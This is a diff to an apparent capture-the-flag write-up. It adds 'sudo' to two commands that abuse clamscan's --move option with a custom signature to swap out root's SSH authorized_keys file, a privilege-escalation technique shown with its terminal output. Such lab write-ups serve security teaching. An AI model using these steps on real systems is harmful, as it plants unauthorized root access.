@@ -532,7 +532,7 @@ End Date:   2023:05:09 22:29:21
 
 If we send a copy to /root/.ssh/authorized_keys now, it will be renamed to authorized_keys1 since there already exists keys. We can scan /root/.ssh/authorized_keys now, and move it somewhere else:
 ```bash
-sbrown@snoopy:/tmp$ clamscan -d 1.ndb /root/.ssh/authorized_keys --move=./
+sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb /root/.ssh/authorized_keys --move=./
 Loading:     0s, ETA:   0s [========================>]        1/1 sigs
 Compiling:   0s, ETA:   0s [========================>]       40/40 tasks
 
@@ -561,7 +561,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoYOhyzFyp/SK3eAv9dlpn7iXK16ZyDfwaFWvxP09j
 ```
 Lastly, I sent it back:
 ```bash
-sbrown@snoopy:/tmp$ clamscan -d 1.ndb ./authorized_keys --move=/root/.ssh/
+sbrown@snoopy:/tmp$ sudo clamscan -d 1.ndb ./authorized_keys --move=/root/.ssh/
 Loading:     0s, ETA:   0s [========================>]        1/1 sigs
 Compiling:   0s, ETA:   0s [========================>]       40/40 tasks
 
